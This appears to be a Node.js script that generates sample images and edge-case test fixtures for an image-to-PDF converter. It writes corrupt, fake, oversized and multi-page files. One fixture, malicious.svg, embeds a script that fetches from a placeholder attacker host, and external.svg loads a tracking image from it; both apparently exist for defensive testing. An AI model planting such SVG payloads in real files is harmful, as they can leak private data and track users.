import sharp from 'sharp';
import { mkdir, writeFile, readFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
await mkdir('public/samples', { recursive: true });
await mkdir('tests/fixtures', { recursive: true });
const svg = (w, h, body) =>
  `<svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}" viewBox="0 0 ${w} ${h}">${body}</svg>`;
const landscape = svg(
  960,
  640,
  `<rect width="960" height="640" fill="#e7eedc"/><circle cx="735" cy="170" r="78" fill="#e9b967"/><path d="M0 390 240 160 500 440 690 300 960 470V640H0" fill="#7a9b79"/><path d="M0 470 320 350 600 520 960 380V640H0" fill="#285f49"/><path d="M340 640Q540 490 800 550T960 500V640" fill="#c6d8af"/><text x="50" y="70" font-size="16" font-family="sans-serif" fill="#285f49" letter-spacing="4">PIX2PDF / ORIGINAL STUDY 01</text><text x="50" y="580" font-size="45" font-family="serif" fill="#ffffff">A little room to breathe.</text>`,
);
const transparent = svg(
  640,
  800,
  `<circle cx="260" cy="340" r="180" fill="#e9b967" opacity=".85"/><circle cx="390" cy="440" r="180" fill="#285f49" opacity=".8"/><rect x="90" y="130" width="320" height="410" rx="160" fill="#7a9b79" opacity=".65"/><text x="80" y="710" font-size="31" font-family="sans-serif" fill="#285f49">02 / Space between things</text>`,
);
const graphic = svg(
  900,
  600,
  `<rect width="900" height="600" fill="#285f49"/>${Array.from({ length: 18 }, (_, i) => `<path d="M${50 + i * 19} 500Q${360 + i * 12} 70 810 ${100 + i * 22}" fill="none" stroke="#c6d8af" stroke-width="3"/>`).join('')}<text x="50" y="70" font-family="sans-serif" font-size="17" fill="#e7eedc" letter-spacing="4">03 / A DIFFERENT PERSPECTIVE</text><circle cx="160" cy="190" r="60" fill="#e9b967"/>`,
);
const vector = svg(
  600,
  600,
  `<rect width="600" height="600" fill="#f0eedf"/><rect x="75" y="70" width="450" height="460" rx="8" fill="none" stroke="#285f49" stroke-width="2"/><circle cx="300" cy="270" r="120" fill="#d4e6c7"/><path d="M170 340 270 180 430 340Z" fill="#285f49"/><circle cx="375" cy="200" r="35" fill="#e9b967"/><text x="135" y="440" font-family="serif" font-size="38" fill="#285f49">Less, but together.</text><text x="190" y="480" font-family="sans-serif" font-size="12" fill="#285f49" letter-spacing="3">04 / SHAPES INTO PAGES</text>`,
);
await sharp(Buffer.from(landscape))
  .jpeg({ quality: 93 })
  .toFile('public/samples/sample-photo.jpg');
await sharp(Buffer.from(transparent))
  .png()
  .toFile('public/samples/sample-transparent.png');
await sharp(Buffer.from(graphic))
  .webp({ quality: 93 })
  .toFile('public/samples/sample-graphic.webp');
await writeFile('public/samples/sample-vector.svg', vector);
const w = 160,
  h = 100,
  rgba = Buffer.alloc(w * h * 4);
for (let y = 0; y < h; y++)
  for (let x = 0; x < w; x++) {
    const i = (y * w + x) * 4;
    rgba.set(
      x < w / 2
        ? y < h / 2
          ? [220, 30, 30, 255]
          : [30, 60, 220, 255]
        : y < h / 2
          ? [30, 180, 60, 255]
          : [240, 200, 30, 255],
      i,
    );
  }
const raster = () => sharp(rgba, { raw: { width: w, height: h, channels: 4 } });
await raster().png().toFile('tests/fixtures/quadrants.png');
await raster()
  .jpeg({ quality: 100, chromaSubsampling: '4:4:4' })
  .toFile('tests/fixtures/landscape.jpg');
await raster()
  .rotate(90)
  .jpeg({ quality: 100 })
  .toFile('tests/fixtures/portrait.jpg');
await raster().webp({ lossless: true }).toFile('tests/fixtures/graphic.webp');
await raster().avif({ lossless: true }).toFile('tests/fixtures/graphic.avif');
for (let o = 1; o <= 8; o++)
  await raster()
    .withMetadata({ orientation: o })
    .jpeg({ quality: 100, chromaSubsampling: '4:4:4' })
    .toFile(`tests/fixtures/exif-${o}.jpg`);
const alpha = Buffer.from(rgba);
for (let y = 0; y < h; y++)
  for (let x = 0; x < w; x++)
    if (x < 20 || y < 20 || x >= w - 20 || y >= h - 20)
      alpha[(y * w + x) * 4 + 3] = 0;
await sharp(alpha, { raw: { width: w, height: h, channels: 4 } })
  .png()
  .toFile('tests/fixtures/transparent.png');
const second = Buffer.alloc(rgba.length);
for (let i = 0; i < second.length; i += 4) second.set([255, 0, 255, 255], i);
await sharp(Buffer.concat([rgba, second]), {
  raw: { width: w, height: h * 2, channels: 4, pageHeight: h },
})
  .gif({ loop: 0, delay: [100, 100] })
  .toFile('tests/fixtures/animation.gif');
// Original uncompressed BMP, bottom-up BGR rows.
const stride = Math.ceil((w * 3) / 4) * 4,
  bmp = Buffer.alloc(54 + stride * h);
bmp.write('BM');
bmp.writeUInt32LE(bmp.length, 2);
bmp.writeUInt32LE(54, 10);
bmp.writeUInt32LE(40, 14);
bmp.writeInt32LE(w, 18);
bmp.writeInt32LE(h, 22);
bmp.writeUInt16LE(1, 26);
bmp.writeUInt16LE(24, 28);
bmp.writeUInt32LE(stride * h, 34);
for (let y = 0; y < h; y++)
  for (let x = 0; x < w; x++) {
    const src = (y * w + x) * 4,
      dst = 54 + (h - y - 1) * stride + x * 3;
    bmp.set([rgba[src + 2], rgba[src + 1], rgba[src]], dst);
  }
await writeFile('tests/fixtures/graphic.bmp', bmp);
const icon = await raster().resize(32, 32).png().toBuffer(),
  ico = Buffer.alloc(22);
ico.writeUInt16LE(1, 2);
ico.writeUInt16LE(1, 4);
ico[6] = ico[7] = 32;
ico.writeUInt16LE(1, 10);
ico.writeUInt16LE(32, 12);
ico.writeUInt32LE(icon.length, 14);
ico.writeUInt32LE(22, 18);
await writeFile('tests/fixtures/graphic.ico', Buffer.concat([ico, icon]));
// TIFF with a bounded, standards-based RGB IFD per page; no third-party artwork.
function tiff(pages) {
  const entries = 10,
    block = 2 + entries * 12 + 4 + 6 + w * h * 3;
  const out = Buffer.alloc(8 + pages.length * block);
  out.write('II');
  out.writeUInt16LE(42, 2);
  out.writeUInt32LE(8, 4);
  pages.forEach((data, p) => {
    const offset = 8 + p * block,
      bits = offset + 2 + entries * 12 + 4,
      pixels = bits + 6;
    out.writeUInt16LE(entries, offset);
    const tags = [
      [256, 4, 1, w],
      [257, 4, 1, h],
      [258, 3, 3, bits],
      [259, 3, 1, 1],
      [262, 3, 1, 2],
      [273, 4, 1, pixels],
      [277, 3, 1, 3],
      [278, 4, 1, h],
      [279, 4, 1, w * h * 3],
      [284, 3, 1, 1],
    ];
    tags.forEach(([tag, type, count, value], i) => {
      const at = offset + 2 + i * 12;
      out.writeUInt16LE(tag, at);
      out.writeUInt16LE(type, at + 2);
      out.writeUInt32LE(count, at + 4);
      out.writeUInt32LE(value, at + 8);
    });
    out.writeUInt32LE(
      p < pages.length - 1 ? offset + block : 0,
      offset + 2 + entries * 12,
    );
    for (let c = 0; c < 3; c++) out.writeUInt16LE(8, bits + 2 * c);
    for (let i = 0; i < w * h; i++)
      out.set(data.subarray(i * 4, i * 4 + 3), pixels + i * 3);
  });
  return out;
}
await writeFile('tests/fixtures/graphic.tiff', tiff([rgba]));
await writeFile('tests/fixtures/multi.tiff', tiff([rgba, second]));
await raster().tiff({ compression: 'lzw' }).toFile('tests/fixtures/lzw.tiff');
await raster()
  .tiff({ compression: 'deflate' })
  .toFile('tests/fixtures/deflate.tiff');
await writeFile(
  'tests/fixtures/vector.svg',
  svg(
    160,
    100,
    '<rect width="80" height="50" fill="#dc1e1e"/><rect x="80" width="80" height="50" fill="#1eb43c"/><rect y="50" width="80" height="50" fill="#1e3cdc"/><rect x="80" y="50" width="80" height="50" fill="#f0c81e"/>',
  ),
);
await writeFile(
  'tests/fixtures/malicious.svg',
  svg(
    160,
    100,
    '<script>globalThis.PIX2PDF_ATTACK=true;fetch("https://attacker.invalid/private-image")</script><rect width="160" height="100" fill="red"/>',
  ),
);
await writeFile(
  'tests/fixtures/external.svg',
  svg(
    160,
    100,
    '<image href="https://attacker.invalid/track" width="160" height="100"/>',
  ),
);
await writeFile('tests/fixtures/empty.png', '');
await writeFile(
  'tests/fixtures/fake.jpg',
  'PRIVATE-SENTINEL-7c924b is plain text, not an image',
);
await writeFile(
  'tests/fixtures/corrupt.jpg',
  Buffer.from([255, 216, 255, 224, 0, 25]),
);
await writeFile(
  'tests/fixtures/corrupt.png',
  (await readFile('tests/fixtures/quadrants.png')).subarray(0, 60),
);
const huge = Buffer.from(await readFile('tests/fixtures/quadrants.png'));
huge.writeUInt32BE(100000, 16);
await writeFile('tests/fixtures/huge-dimensions.png', huge);
for (const [name, width, height] of [
  ['wide', 4000, 40],
  ['tall', 40, 4000],
  ['tiny', 1, 1],
  ['large', 4000, 3000],
])
  await sharp({ create: { width, height, channels: 3, background: '#285f49' } })
    .png()
    .toFile(`tests/fixtures/${name}.png`);
await writeFile(
  'tests/fixtures/renamed.jpg',
  await readFile('tests/fixtures/quadrants.png'),
);
await writeFile(
  'tests/fixtures/旅行.png',
  await readFile('tests/fixtures/quadrants.png'),
);
const social = svg(
  1200,
  630,
  '<rect width="1200" height="630" fill="#edf4ed"/><text x="80" y="110" font-family="sans-serif" font-size="32" font-weight="bold" fill="#285f49">Pix2PDF</text><text x="80" y="290" font-family="sans-serif" font-size="90" fill="#273c33">Images in.</text><text x="80" y="390" font-family="serif" font-size="90" font-style="italic" fill="#285f49">PDF out.</text><text x="80" y="500" font-family="sans-serif" font-size="27" fill="#59695f">Turn images into PDFs. Keep them private.</text><text x="80" y="555" font-family="sans-serif" font-size="20" fill="#285f49">NO UPLOADS · FREE &amp; OPEN SOURCE</text>',
);
await sharp(Buffer.from(social)).png().toFile('public/social-preview.png');
const sample = await readFile('public/samples/sample-photo.jpg');
console.log(
  `Generated original samples and edge fixtures. JPEG SHA-256 ${createHash('sha256').update(sample).digest('hex')}`,
);
